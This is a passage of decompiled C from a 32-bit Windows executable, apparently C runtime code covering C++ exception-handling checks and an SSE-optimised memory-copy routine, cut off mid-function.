int32_t function_40878e(void) {
    // 0x40878e
    if (*(int32_t *)(function_407362() + 4) != 0) {
        // 0x40879b
        function_4065bf();
    }
    // 0x4087a5
    function_40a896();
    // UNREACHABLE
}

// Address range: 0x4087ab - 0x408838
int32_t function_4087ab(void) {
    // 0x4087ab
    function_406770(&g86, 8, (int32_t)&g266);
    int32_t v1; // 0x4087ab
    int32_t v2 = *(int32_t *)(v1 + 8); // 0x4087b7
    int32_t result; // 0x408832
    if (v2 == 0 || *(int32_t *)v2 != -0x1f928c9d || *(int32_t *)(v2 + 16) != 3) {
        // 0x408832
        result = function_4067b6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        return result;
    }
    int32_t v3 = *(int32_t *)(v2 + 20); // 0x4087cc
    if ((v3 & -2) != 0x19930520 == (v3 != 0x19930522)) {
        // 0x408832
        result = function_4067b6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        return result;
    }
    int32_t v4 = *(int32_t *)(v2 + 28); // 0x4087e7
    if (v4 == 0) {
        // 0x408832
        result = function_4067b6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        return result;
    }
    int32_t v5 = *(int32_t *)(v4 + 4); // 0x4087ee
    if (v5 != 0) {
        int32_t * v6 = (int32_t *)(v1 - 4); // 0x4087f5
        *v6 = 0;
        function_408841(*(int32_t *)(v2 + 24), v5);
        *v6 = -2;
        // 0x408832
        result = function_4067b6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        return result;
    }
    // 0x408814
    if ((*(char *)v4 & 16) == 0) {
        // 0x408832
        result = function_4067b6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        return result;
    }
    // 0x408819
    if (*(int32_t *)*(int32_t *)(v2 + 24) != 0) {
        // 0x408822
        function_4065bf();
    }
    // 0x408832
    result = function_4067b6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
    return result;
}

// Address range: 0x408841 - 0x40884e
int32_t function_408841(int32_t a1, int32_t a2) {
    // 0x408841
    int32_t result; // 0x408841
    return result;
}

// Address range: 0x40884e - 0x408874
int32_t function_40884e(int32_t a1) {
    int32_t v1 = *(int32_t *)(function_407362() + 36); // 0x408856
    if (v1 == 0) {
        // 0x40886b
        return 1;
    }
    int32_t v2 = v1; // 0x40885b
    int32_t result = 0; // 0x408862
    while (*(int32_t *)v2 != a1) {
        // 0x408864
        v2 += 4;
        result = 1;
        if (v2 == 0) {
            // break -> 0x40886b
            break;
        }
        result = 0;
    }
    // 0x40886b
    return result;
}

// Address range: 0x408874 - 0x408899
int32_t function_408874(int32_t a1, int32_t a2) {
    uint32_t v1 = *(int32_t *)(a2 + 4); // 0x408880
    int32_t v2 = *(int32_t *)a2 + a1; // 0x408883
    int32_t result = v2; // 0x408887
    if (v1 >= 0) {
        int32_t v3 = *(int32_t *)(*(int32_t *)(v1 + a1) + *(int32_t *)(a2 + 8)); // 0x40888f
        result = v2 + v1 + v3;
    }
    // 0x408896
    return result;
}

// Address range: 0x408899 - 0x4088de
int32_t function_408899(int32_t a1) {
    int32_t v1 = *(int32_t *)*(int32_t *)a1; // 0x4088a1
    switch (v1) {
        case -0x1fbcbcae: {
        }
        case -0x1fbcb0b3: {
            // 0x4088c7
            if (*(int32_t *)(function_407362() + 24) >= 1) {
                int32_t * v2 = (int32_t *)(function_407362() + 24); // 0x4088d7
                *v2 = *v2 - 1;
            }
            // break -> 0x4088da
            break;
        }
        default: {
            if (v1 == -0x1f928c9d) {
                // 0x4088b9
                *(int32_t *)(function_407362() + 24) = 0;
                function_40a896();
                // UNREACHABLE
            }
            // break -> 0x4088da
            break;
        }
    }
    // 0x4088da
    return 0;
}

// Address range: 0x4088e0 - 0x408e54
int32_t function_4088e0(int32_t result, int16_t * a2, int32_t a3) {
    int32_t v1 = (int32_t)a2;
    int32_t v2 = v1 + a3; // 0x4088f2
    if (v1 < result == v2 > result) {
        int32_t v3 = a3 + result; // 0x408b97
        int32_t v4 = a3; // 0x408b9d
        int32_t v5 = v2; // 0x408b9d
        int32_t v6 = v3; // 0x408b9d
        if (a3 >= 32) {
            // 0x408ba3
            if ((g114 & 2) == 0) {
                int32_t v7 = v3 & 3; // 0x408bb1
                int32_t v8 = a3; // 0x408bb7
                int32_t v9 = v2; // 0x408bb7
                int32_t v10 = v3; // 0x408bb7
                if (v7 != 0) {
                    int32_t v11 = v2 - 1; // 0x408bc0
                    int32_t v12 = v3 - 1; // 0x408bc3
                    *(char *)v12 = *(char *)v11;
                    int32_t v13 = v7 - 1; // 0x408bc8
                    int32_t v14 = v13; // 0x408bcb
                    int32_t v15 = v11; // 0x408bcb
                    int32_t v16 = v12; // 0x408bcb
                    while (v13 != 0) {
                        // 0x408bc0
                        v11 = v15 - 1;
                        v12 = v16 - 1;
                        *(char *)v12 = *(char *)v11;
                        v13 = v14 - 1;
                        v14 = v13;
                        v15 = v11;
                        v16 = v12;
                    }
                    // 0x408bd6
                    v8 = a3 - v7;
                    v9 = v11;
                    v10 = v12;
                }
                // 0x408bd6
                __asm_rep_movsd_memcpy((char *)(v10 - 4), (char *)(v9 - 4), v8 / 4);
                g262 = v8 & 3;
                // 0x408b54
                return result;
            }
            int32_t v17 = a3; // 0x408c4b
            int32_t v18 = v2; // 0x408c4b
            int32_t v19 = v3; // 0x408c4b
            if ((v3 & 15) != 0) {
                int32_t v20 = a3 - 1; // 0x408c4d
                int32_t v21 = v2 - 1; // 0x408c4e
                int32_t v22 = v3 - 1; // 0x408c4f
                *(char *)v22 = *(char *)v21;
                int32_t v23 = v20; // 0x408c5a
                int32_t v24 = v21; // 0x408c5a
                int32_t v25 = v22; // 0x408c5a
                v17 = v20;
                v18 = v21;
                v19 = v22;
                while ((v22 & 15) != 0) {
                    // 0x408c4d
                    v20 = v23 - 1;
                    v21 = v24 - 1;
                    v22 = v25 - 1;
                    *(char *)v22 = *(char *)v21;
                    v23 = v20;
                    v24 = v21;
                    v25 = v22;
                    v17 = v20;
                    v18 = v21;
                    v19 = v22;
                }
            }
            int32_t v26 = v17; // 0x408cbe
            int32_t v27 = v19;
            int32_t v28 = v18;
            int32_t v29 = v26; // 0x408c62
            int32_t v30 = v28; // 0x408c62
            int32_t v31 = v27; // 0x408c62
            while (v26 >= 128) {
                int32_t v32 = v28 - 128; // 0x408c64
                int32_t v33 = v27 - 128; // 0x408c6a
                int128_t v34 = __asm_movdqu_5(*(int128_t *)v32); // 0x408c70
                int128_t v35 = __asm_movdqu_5(*(int128_t *)(v28 - 112)); // 0x408c74
                int128_t v36 = __asm_movdqu_5(*(int128_t *)(v28 - 96)); // 0x408c79
                int128_t v37 = __asm_movdqu_5(*(int128_t *)(v28 - 80)); // 0x408c7e
                int128_t v38 = __asm_movdqu_5(*(int128_t *)(v28 - 64)); // 0x408c83
                int128_t v39 = __asm_movdqu_5(*(int128_t *)(v28 - 48)); // 0x408c88
                int128_t v40 = __asm_movdqu_5(*(int128_t *)(v28 - 32)); // 0x408c8d
                int128_t v41 = __asm_movdqu_5(*(int128_t *)(v28 - 16)); // 0x408c92
                __asm_movdqu(*(int128_t *)v33, v34);
                __asm_movdqu(*(int128_t *)(v27 - 112), v35);
                __asm_movdqu(*(int128_t *)(v27 - 96), v36);
                __asm_movdqu(*(int128_t *)(v27 - 80), v37);
                __asm_movdqu(*(int128_t *)(v27 - 64), v38);
                __asm_movdqu(*(int128_t *)(v27 - 48), v39);
                __asm_movdqu(*(int128_t *)(v27 - 32), v40);
                __asm_movdqu(*(int128_t *)(v27 - 16), v41);
                v26 -= 128;
                v29 = v26;
                v30 = v32;
                v31 = v33;
                if (v26 < 128) {
                    // break -> 0x408ccc
                    break;
                }
                v27 = v33;
                v28 = v32;
                v29 = v26;
                v30 = v28;
                v31 = v27;
            }
            // 0x408ccc
            v4 = v29;
            v5 = v30;
            v6 = v31;
            if (v29 >= 32) {
                int32_t v42 = v30 - 32; // 0x408cd1
                int32_t v43 = v31 - 32; // 0x408cd4
                int128_t v44 = __asm_movdqu_5(*(int128_t *)v42); // 0x408cd7
                int128_t v45 = __asm_movdqu_5(*(int128_t *)(v30 - 16)); // 0x408cdb
                __asm_movdqu(*(int128_t *)v43, v44);
                __asm_movdqu(*(int128_t *)(v31 - 16), v45);
                int32_t v46 = v29 - 32; // 0x408ce9
                int32_t v47 = v46; // 0x408cf2
                int32_t v48 = v42; // 0x408cf2
                int32_t v49 = v43; // 0x408cf2
                v4 = v46;
                v5 = v42;
                v6 = v43;
                while (v46 >= 32) {
                    // 0x408cd1
                    v42 = v48 - 32;
                    v43 = v49 - 32;
                    v44 = __asm_movdqu_5(*(int128_t *)v42);
                    v45 = __asm_movdqu_5(*(int128_t *)(v48 - 16));
                    __asm_movdqu(*(int128_t *)v43, v44);
                    __asm_movdqu(*(int128_t *)(v49 - 16), v45);
                    v46 = v47 - 32;
                    v47 = v46;
                    v48 = v42;
                    v49 = v43;
                    v4 = v46;
                    v5 = v42;
                    v6 = v43;
                }
            }
        }
        int32_t v50 = v4; // 0x408cfa
        int32_t v51 = v5; // 0x408cfa
        int32_t v52 = v6; // 0x408cfa
        if (v4 >= 4) {
            int32_t v53 = v6 - 4; // 0x408cfc
            int32_t v54 = v5 - 4; // 0x408cff
            *(int32_t *)v53 = *(int32_t *)v54;
            int32_t v55 = v4 - 4; // 0x408d06
            int32_t v56 = v55; // 0x408d0f
            int32_t v57 = v54; // 0x408d0f
            int32_t v58 = v53; // 0x408d0f
            v50 = v55;
            v51 = v54;
            v52 = v53;
            while (v55 >= 4) {
                // 0x408cfc
                v53 = v58 - 4;
                v54 = v57 - 4;
                *(int32_t *)v53 = *(int32_t *)v54;
                v55 = v56 - 4;
                v56 = v55;
                v57 = v54;
                v58 = v53;
                v50 = v55;
                v51 = v54;
                v52 = v53;
            }
        }
        int32_t v59 = v50; // 0x408d13
        int32_t v60 = v51; // 0x408d13
        if (v50 == 0) {
            // 0x408b54
            return result;
        }
        int32_t v61 = v52; // 0x408d13
        v61--;
        v60--;
        *(char *)v61 = *(char *)v60;
        v59--;
        while (v59 != 0) {
            // 0x408d15
            v61--;
            v60--;
            *(char *)v61 = *(char *)v60;
            v59--;
        }
        // 0x408b54
        return result;
    }
    int32_t v62 = a3; // 0x408903
    int32_t v63 = v1; // 0x408903
    int32_t v64 = result; // 0x408903
    int32_t v65; // 0x4088e0
    int32_t v66; // 0x4088e0
    int32_t v67; // 0x4088e0
    int32_t v68; // bp-8, 0x4088e0
    if (a3 < 32) {
        goto lab_0x408ddb;
    } else {
        if (a3 >= 128) {
            // 0x408924
            if ((g163 & 2) != 0) {
                // 0x40892e
                __asm_rep_movsb_memcpy((char *)result, (char *)a2, a3);
                return result;
            }
            if (((v1 ^ result) & 15) != 0) {
                goto lab_0x408950;
            } else {
                // 0x408942
                if ((g114 & 2) == 0) {
                    goto lab_0x408950;
                } else {
                    int32_t v69 = v1 & 15; // 0x408d32
                    int32_t v70 = a3; // 0x408d37
                    int32_t v71 = v1; // 0x408d37
                    int32_t v72 = result; // 0x408d37
                    if (v69 != 0) {
                        uint32_t v73 = 16 - v69; // 0x408e25
                        int32_t v74 = v73 & 3; // 0x408e2e
                        int32_t v75 = v1; // 0x408e31
                        int32_t v76 = result; // 0x408e31
                        if (v74 != 0) {
                            *(char *)result = *(char *)v1;
                            int32_t v77 = v1 + 1; // 0x408e37
                            int32_t v78 = result + 1; // 0x408e38
                            int32_t v79 = v74 - 1; // 0x408e39
                            int32_t v80 = v79; // 0x408e3a
                            int32_t v81 = v77; // 0x408e3a
                            int32_t v82 = v78; // 0x408e3a
                            v75 = v77;
                            v76 = v78;
                            while (v79 != 0) {
                                // 0x408e33
                                *(char *)v82 = *(char *)v81;
                                v77 = v81 + 1;
                                v78 = v82 + 1;
                                v79 = v80 - 1;
                                v80 = v79;
                                v81 = v77;
                                v82 = v78;
                                v75 = v77;
                                v76 = v78;
                            }
                        }
                        int32_t v83 = a3 - v73; // 0x408e27
                        v70 = v83;
                        v71 = v75;
                        v72 = v76;
                        if (v73 >= 4) {
                            *(int32_t *)v76 = *(int32_t *)v75;
                            int32_t v84 = v75 + 4; // 0x408e45
                            int32_t v85 = v76 + 4; // 0x408e48
                            int32_t v86 = v73 / 4 - 1; // 0x408e4b
                            v70 = v83;
                            v71 = v84;
                            v72 = v85;
                            int32_t v87 = v86; // 0x408e4c
                            int32_t v88 = v84; // 0x408e4c
                            int32_t v89 = v85; // 0x408e4c
                            while (v86 != 0) {
                                // 0x408e41
                                *(int32_t *)v89 = *(int32_t *)v88;
                                v84 = v88 + 4;
                                v85 = v89 + 4;
                                v86 = v87 - 1;
                                v70 = v83;
                                v71 = v84;
                                v72 = v85;
                                v87 = v86;
                                v88 = v84;
                                v89 = v85;
                            }
                        }
                    }
                    int32_t v90 = v71; // 0x408d45
                    int32_t v91 = v72; // 0x408d45
                    if (v70 >= 128) {
                        int128_t v92 = __asm_movdqa_4(*(int128_t *)v71); // 0x408d50
                        int128_t v93 = __asm_movdqa_4(*(int128_t *)(v71 + 16)); // 0x408d54
                        int128_t v94 = __asm_movdqa_4(*(int128_t *)(v71 + 32)); // 0x408d59
                        int128_t v95 = __asm_movdqa_4(*(int128_t *)(v71 + 48)); // 0x408d5e
                        __asm_movdqa(*(int128_t *)v72, v92);
                        __asm_movdqa(*(int128_t *)(v72 + 16), v93);
                        __asm_movdqa(*(int128_t *)(v72 + 32), v94);
                        __asm_movdqa(*(int128_t *)(v72 + 48), v95);
                        int128_t v96 = __asm_movdqa_4(*(int128_t *)(v71 + 64)); // 0x408d76
                        int128_t v97 = __asm_movdqa_4(*(int128_t *)(v71 + 80)); // 0x408d7b
                        int128_t v98 = __asm_movdqa_4(*(int128_t *)(v71 + 96)); // 0x408d80
                        int128_t v99 = __asm_movdqa_4(*(int128_t *)(v71 + 112)); // 0x408d85
                        __asm_movdqa(*(int128_t *)(v72 + 64), v96);
                        __asm_movdqa(*(int128_t *)(v72 + 80), v97);
                        __asm_movdqa(*(int128_t *)(v72 + 96), v98);
                        __asm_movdqa(*(int128_t *)(v72 + 112), v99);
                        int32_t v100 = v71 + 128; // 0x408d9e
                        int32_t v101 = v72 + 128; // 0x408da4
                        int32_t v102 = v70 / 128 - 1; // 0x408daa
                        int32_t v103 = v102; // 0x408dab
                        int32_t v104 = v100; // 0x408dab
                        int32_t v105 = v101; // 0x408dab
                        v90 = v100;
                        v91 = v101;
                        while (v102 != 0) {
                            // 0x408d50
                            v92 = __asm_movdqa_4(*(int128_t *)v104);
                            v93 = __asm_movdqa_4(*(int128_t *)(v104 + 16));
                            v94 = __asm_movdqa_4(*(int128_t *)(v104 + 32));
                            v95 = __asm_movdqa_4(*(int128_t *)(v104 + 48));
                            __asm_movdqa(*(int128_t *)v105, v92);
                            __asm_movdqa(*(int128_t *)(v105 + 16), v93);
                            __asm_movdqa(*(int128_t *)(v105 + 32), v94);
                            __asm_movdqa(*(int128_t *)(v105 + 48), v95);
                            v96 = __asm_movdqa_4(*(int128_t *)(v104 + 64));
                            v97 = __asm_movdqa_4(*(int128_t *)(v104 + 80));
                            v98 = __asm_movdqa_4(*(int128_t *)(v104 + 96));
                            v99 = __asm_movdqa_4(*(int128_t *)(v104 + 112));
                            __asm_movdqa(*(int128_t *)(v105 + 64), v96);
                            __asm_movdqa(*(int128_t *)(v105 + 80), v97);
                            __asm_movdqa(*(int128_t *)(v105 + 96), v98);
                            __asm_movdqa(*(int128_t *)(v105 + 112), v99);
                            v100 = v104 + 128;
                            v101 = v105 + 128;
                            v102 = v103 - 1;
                            v103 = v102;
                            v104 = v100;
                            v105 = v101;
                            v90 = v100;
                            v91 = v101;
                        }
                    }
                    int32_t v106 = v70 & 127; // 0x408d3f
                    v66 = v91;
                    v67 = v90;
                    v65 = v106;
                    if (v106 == 0) {
                        // 0x408e10
                        return *(int32_t *)((int32_t)&v68 + 12);
                    }
                    goto lab_0x408db1;
                }
            }
        } else {
            // 0x408911
            v66 = result;
            v67 = v1;
            v65 = a3;
            if ((g114 & 2) == 0) {
                goto lab_0x408b07;
            } else {
                goto lab_0x408db1;
            }
        }
    }
  lab_0x408ddb:;
    uint32_t v107 = v62 & 31; // 0x408ddb
    if (v107 == 0) {
        // 0x408e10
        return *(int32_t *)((int32_t)&v68 + 12);
    }
    int32_t v108 = v63; // 0x408de5
    int32_t v109 = v64; // 0x408de5
    if (v107 >= 4) {
        *(int32_t *)v64 = *(int32_t *)v63;
        int32_t v110 = v64 + 4; // 0x408deb
        int32_t v111 = v63 + 4; // 0x408dee
        int32_t v112 = v107 / 4 - 1; // 0x408df1
        int32_t v113 = v112; // 0x408df4
        int32_t v114 = v111; // 0x408df4
        int32_t v115 = v110; // 0x408df4
        v108 = v111;
        v109 = v110;
        while (v112 != 0) {
            // 0x408de7
            *(int32_t *)v115 = *(int32_t *)v114;
            v110 = v115 + 4;
            v111 = v114 + 4;
            v112 = v113 - 1;
            v113 = v112;
            v114 = v111;
            v115 = v110;
            v108 = v111;
            v109 = v110;
        }
    }
    int32_t v116 = v62 & 3; // 0x408df8
    int32_t v117 = v108; // 0x408dfb
    if (v116 == 0) {
        // 0x408e10
        return *(int32_t *)((int32_t)&v68 + 12);
    }
    int32_t v118 = v109; // 0x408dfb
    *(char *)v118 = *(char *)v117;
    int32_t v119 = v116 - 1; // 0x408e03
    int32_t v120 = v119; // 0x408e04
    v117++;
    v118++;
    while (v119 != 0) {
        // 0x408dfd
        *(char *)v118 = *(char *)v117;
        v119 = v120 - 1;
        v120 = v119;
        v117++;
        v118++;
    }
    // 0x408e10
    return *(int32_t *)((int32_t)&v68 + 12);
  lab_0x408950:;
    int32_t v121; // 0x4088e0
    int32_t v122; // 0x4088e0
    int32_t v123; // 0x4088e0
    int32_t v124; // 0x4088e0
    int32_t v125; // 0x4088e0
    int32_t v126; // 0x4088e0
    int32_t v127; // 0x4088e0
    int32_t v128; // 0x4088e0
    int32_t v129; // 0x4088e0
    if ((g163 & 1) == 0) {
        goto lab_0x408b07;
    } else {
        if ((result & 3) != 0) {
            goto lab_0x408b07;
        } else {
            // 0x40896a
            v121 = a3;
            v129 = v1;
            v125 = result;
            if ((v1 & 3) == 0) {
                int32_t v130 = a3; // 0x40897a
                int32_t v131 = v1; // 0x40897a
                int32_t v132 = result; // 0x40897a
                if ((result & 4) != 0) {
                    // 0x40897c
                    *(int32_t *)result = *(int32_t *)a2;
                    v130 = a3 - 4;
                    v131 = v1 + 4;
                    v132 = result + 4;
                }
                int32_t v133 = v130; // 0x40898d
                int32_t v134 = v131; // 0x40898d
                int32_t v135 = v132; // 0x40898d
                if ((v132 & 8) != 0) {
                    // 0x40898f
                    __asm_movq_3(*(int64_t *)v132, __asm_movq(*(int64_t *)v131));
                    v133 = v130 - 8;
                    v134 = v131 + 8;
                    v135 = v132 + 8;
                }
                // 0x4089a0
                int32_t v136; // 0x4088e0
                int32_t v137; // 0x4088e0
                int32_t v138; // 0x4088e0
                if ((v134 & 7) == 0) {
                    int32_t v139 = v134 - 8; // 0x408a0d
                    int128_t v140 = __asm_movdqa_4(*(int128_t *)v139); // 0x408a15
                    int32_t v141 = v139;
                    int128_t v142 = __asm_movdqa_4(*(int128_t *)(v141 + 16)); // 0x408a18
                    int32_t v143 = v133 - 48; // 0x408a1d
                    int128_t v144 = __asm_movdqa_4(*(int128_t *)(v141 + 32)); // 0x408a20
                    int32_t v145 = v141 + 48; // 0x408a25
                    int128_t v146 = __asm_movdqa_4(*(int128_t *)v145); // 0x408a25
                    int128_t v147 = __asm_movdqa_4(v142); // 0x408a30
                    __asm_movdqa(*(int128_t *)v135, __asm_palignr(v142, v140, 8));
                    int128_t v148 = __asm_movdqa_4(v144); // 0x408a3e
                    __asm_movdqa(*(int128_t *)(v135 + 16), __asm_palignr(v144, v147, 8));
                    v140 = __asm_movdqa_4(v146);
                    __asm_movdqa(*(int128_t *)(v135 + 32), __asm_palignr(v146, v148, 8));
                    int32_t v149 = v135 + 48; // 0x408a5c
                    int32_t v150 = v143; // 0x408a5f
                    int32_t v151 = v149; // 0x408a5f
                    while (v143 > 47) {
                        // 0x408a18
                        v141 = v145;
                        v142 = __asm_movdqa_4(*(int128_t *)(v141 + 16));
                        v143 = v150 - 48;
                        v144 = __asm_movdqa_4(*(int128_t *)(v141 + 32));
                        v145 = v141 + 48;
                        v146 = __asm_movdqa_4(*(int128_t *)v145);
                        v147 = __asm_movdqa_4(v142);
                        __asm_movdqa(*(int128_t *)v151, __asm_palignr(v142, v140, 8));
                        v148 = __asm_movdqa_4(v144);
                        __asm_movdqa(*(int128_t *)(v151 + 16), __asm_palignr(v144, v147, 8));
                        v140 = __asm_movdqa_4(v146);
                        __asm_movdqa(*(int128_t *)(v151 + 32), __asm_palignr(v146, v148, 8));
                        v149 = v151 + 48;
                        v150 = v143;
                        v151 = v149;
                    }
                    // 0x408a61
                    v136 = v143;
                    v138 = v141 + 56;
                    v137 = v149;
                } else {
                    if ((v134 & 8) == 0) {
                        int32_t v152 = v134 - 4; // 0x408a66
                        int128_t v153 = __asm_movdqa_4(*(int128_t *)v152); // 0x408a6e
                        int32_t v154 = v152;
                        int128_t v155 = __asm_movdqa_4(*(int128_t *)(v154 + 16)); // 0x408a70
                        int32_t v156 = v133 - 48; // 0x408a75
                        int128_t v157 = __asm_movdqa_4(*(int128_t *)(v154 + 32)); // 0x408a78
                        int32_t v158 = v154 + 48; // 0x408a7d
                        int128_t v159 = __asm_movdqa_4(*(int128_t *)v158); // 0x408a7d
                        int128_t v160 = __asm_movdqa_4(v155); // 0x408a88
                        __asm_movdqa(*(int128_t *)v135, __asm_palignr(v155, v153, 4));
                        int128_t v161 = __asm_movdqa_4(v157); // 0x408a96
                        __asm_movdqa(*(int128_t *)(v135 + 16), __asm_palignr(v157, v160, 4));
                        v153 = __asm_movdqa_4(v159);
                        __asm_movdqa(*(int128_t *)(v135 + 32), __asm_palignr(v159, v161, 4));
                        int32_t v162 = v135 + 48; // 0x408ab4
                        int32_t v163 = v156; // 0x408ab7
                        int32_t v164 = v162; // 0x408ab7
                        while (v156 > 47) {
                            // 0x408a70
                            v154 = v158;
                            v155 = __asm_movdqa_4(*(int128_t *)(v154 + 16));
                            v156 = v163 - 48;
                            v157 = __asm_movdqa_4(*(int128_t *)(v154 + 32));
                            v158 = v154 + 48;
                            v159 = __asm_movdqa_4(*(int128_t *)v158);
                            v160 = __asm_movdqa_4(v155);
                            __asm_movdqa(*(int128_t *)v164, __asm_palignr(v155, v153, 4));
                            v161 = __asm_movdqa_4(v157);
                            __asm_movdqa(*(int128_t *)(v164 + 16), __asm_palignr(v157, v160, 4));
                            v153 = __asm_movdqa_4(v159);
                            __asm_movdqa(*(int128_t *)(v164 + 32), __asm_palignr(v159, v161, 4));
                            v162 = v164 + 48;
                            v163 = v156;
                            v164 = v162;
                        }
                        // 0x408ab9
                        v136 = v156;
                        v138 = v154 + 52;
                        v137 = v162;
                    } else {
                        int32_t v165 = v134 - 12; // 0x4089b2
                        int128_t v166 = __asm_movdqa_4(*(int128_t *)v165); // 0x4089ba
                        int32_t v167 = v165;
                        int128_t v168 = __asm_movdqa_4(*(int128_t *)(v167 + 16)); // 0x4089bc
                        int32_t v169 = v133 - 48; // 0x4089c1
                        int128_t v170 = __asm_movdqa_4(*(int128_t *)(v167 + 32)); // 0x4089c4
                        int32_t v171 = v167 + 48; // 0x4089c9
                        int128_t v172 = __asm_movdqa_4(*(int128_t *)v171); // 0x4089c9
                        int128_t v173 = __asm_movdqa_4(v168); // 0x4089d4
                        __asm_movdqa(*(int128_t *)v135, __asm_palignr(v168, v166, 12));
                        int128_t v174 = __asm_movdqa_4(v170); // 0x4089e2
                        __asm_movdqa(*(int128_t *)(v135 + 16), __asm_palignr(v170, v173, 12));
                        v166 = __asm_movdqa_4(v172);
                        __asm_movdqa(*(int128_t *)(v135 + 32), __asm_palignr(v172, v174, 12));
                        int32_t v175 = v135 + 48; // 0x408a00
                        int32_t v176 = v169; // 0x408a03
                        int32_t v177 = v175; // 0x408a03
                        while (v169 > 47) {
                            // 0x4089bc
                            v167 = v171;
                            v168 = __asm_movdqa_4(*(int128_t *)(v167 + 16));
                            v169 = v176 - 48;
                            v170 = __asm_movdqa_4(*(int128_t *)(v167 + 32));
                            v171 = v167 + 48;
                            v172 = __asm_movdqa_4(*(int128_t *)v171);
                            v173 = __asm_movdqa_4(v168);
                            __asm_movdqa(*(int128_t *)v177, __asm_palignr(v168, v166, 12));
                            v174 = __asm_movdqa_4(v170);
                            __asm_movdqa(*(int128_t *)(v177 + 16), __asm_palignr(v170, v173, 12));
                            v166 = __asm_movdqa_4(v172);
                            __asm_movdqa(*(int128_t *)(v177 + 32), __asm_palignr(v172, v174, 12));
                            v175 = v177 + 48;
                            v176 = v169;
                            v177 = v175;
                        }
                        // 0x408a05
                        v136 = v169;
                        v138 = v167 + 60;
                        v137 = v175;
                    }
                }
                int32_t v178 = v136; // 0x408abf
                int32_t v179 = v138; // 0x408abf
                int32_t v180 = v137; // 0x408abf
                if (v136 >= 16) {
                    int128_t v181 = __asm_movdqu_5(*(int128_t *)v138); // 0x408ac1
                    int32_t v182 = v136 - 16; // 0x408ac5
                    int32_t v183 = v138 + 16; // 0x408ac8
                    __asm_movdqa(*(int128_t *)v137, v181);
                    int32_t v184 = v137 + 16; // 0x408acf
                    int32_t v185 = v184; // 0x408abf
                    int32_t v186 = v183; // 0x408abf
                    int32_t v187 = v182; // 0x408abf
                    while (v182 >= 16) {
                        // 0x408ac1
                        v181 = __asm_movdqu_5(*(int128_t *)v186);
                        v182 = v187 - 16;
                        v183 = v186 + 16;
                        __asm_movdqa(*(int128_t *)v185, v181);
                        v184 = v185 + 16;
                        v185 = v184;
                        v186 = v183;
                        v187 = v182;
                    }
                    // 0x408abc
                    v178 = v136 & 15;
                    v179 = v183;
                    v180 = v184;
                }
                int32_t v188 = v178; // 0x408ad8
                int32_t v189 = v179; // 0x408ad8
                int32_t v190 = v180; // 0x408ad8
                if ((v178 & 4) != 0) {
                    // 0x408ada
                    *(int32_t *)v180 = *(int32_t *)v179;
                    v188 = v178 - 4;
                    v189 = v179 + 4;
                    v190 = v180 + 4;
                }
                int32_t v191 = v188; // 0x4088e0
                int32_t v192 = v189; // 0x4088e0
                int32_t v193 = v190; // 0x4088e0
                while (true) {
                  lab_0x408afe:
                    // 0x408afe
                    g260 = v191;
                    v126 = v192;
                    v122 = v193;
                    v127 = v192;
                    v123 = v193;
                    v128 = v192;
                    v124 = v193;
                    switch (v191) {
                        case 0: {
                            return result;
                        }
                        case 1: {
                            goto lab_0x408b5c;
                        }
                        case 2: {
                            goto lab_0x408b68;
                        }
                        case 3: {
                            goto lab_0x408b7c;
                        }
                        default: {
                            // 0x408aed
                            __asm_movq_3(*(int64_t *)v193, __asm_movq(*(int64_t *)v192));
                            v191 -= 8;
                            v192 += 8;
                            v193 += 8;
                            goto lab_0x408afe;
                        }
                    }
                }
                // 0x408b54
                return result;
            }
            goto lab_0x408b22;
        }
    }
  lab_0x408b07:
    // 0x408b07
    v121 = a3;
    v129 = v1;
    v125 = result;
    if ((result & 3) != 0) {
        *(char *)result = *(char *)v1;
        int32_t v194 = a3 - 1; // 0x408b13
        int32_t v195 = v1 + 1; // 0x408b14
        int32_t v196 = result + 1; // 0x408b17
        int32_t v197 = v194; // 0x408b20
        int32_t v198 = v195; // 0x408b20
        int32_t v199 = v196; // 0x408b20
        v121 = v194;
        v129 = v195;
        v125 = v196;
        while ((v196 & 3) != 0) {
            // 0x408b0f
            *(char *)v199 = *(char *)v198;
            v194 = v197 - 1;
            v195 = v198 + 1;
            v196 = v199 + 1;
            v197 = v194;
            v198 = v195;
            v199 = v196;
            v121 = v194;
            v129 = v195;
            v125 = v196;
        }
    }
    goto lab_0x408b22;
  lab_0x408db1:
    // 0x408db1
    v62 = v65;
    v63 = v67;
    v64 = v66;
    if (v65 >= 32) {
        int128_t v204 = __asm_movdqu_5(*(int128_t *)v67); // 0x408dc0
        int128_t v205 = __asm_movdqu_5(*(int128_t *)(v67 + 16)); // 0x408dc4
        __asm_movdqu(*(int128_t *)v66, v204);
        __asm_movdqu(*(int128_t *)(v66 + 16), v205);
        int32_t v206 = v67 + 32; // 0x408dd2
        int32_t v207 = v66 + 32; // 0x408dd5
        int32_t v208 = v65 / 32 - 1; // 0x408dd8
        int32_t v209 = v208; // 0x408dd9
        int32_t v210 = v206; // 0x408dd9
        int32_t v211 = v207; // 0x408dd9
        v62 = v65;
        v63 = v206;
        v64 = v207;
        while (v208 != 0) {
            // 0x408dc0
            v204 = __asm_movdqu_5(*(int128_t *)v210);
            v205 = __asm_movdqu_5(*(int128_t *)(v210 + 16));
            __asm_movdqu(*(int128_t *)v211, v204);
            __asm_movdqu(*(int128_t *)(v211 + 16), v205);
            v206 = v210 + 32;
            v207 = v211 + 32;
            v208 = v209 - 1;
            v209 = v208;
            v210 = v206;
            v211 = v207;
            v62 = v65;
            v63 = v206;
            v64 = v207;
        }
    }
    goto lab_0x408ddb;
  lab_0x408b22:;
    uint32_t v200 = v121 / 4; // 0x408b2d
    __asm_rep_movsd_memcpy((char *)v125, (char *)v129, v200);
    bool v201; // 0x4088e0
    int32_t v202 = v125 + v200 * (v201 ? -4 : 4); // 0x408b30
    int32_t v203 = v121 & 3; // 0x408b32
    g261 = v203;
    v126 = v202;
    v122 = v202;
    v127 = v202;
    v123 = v202;
    v128 = v202;
    v124 = v202;
    switch (v203) {
        case 0: {
            // 0x408b54
            return result;
        }
        case 1: {
          lab_0x408b5c:
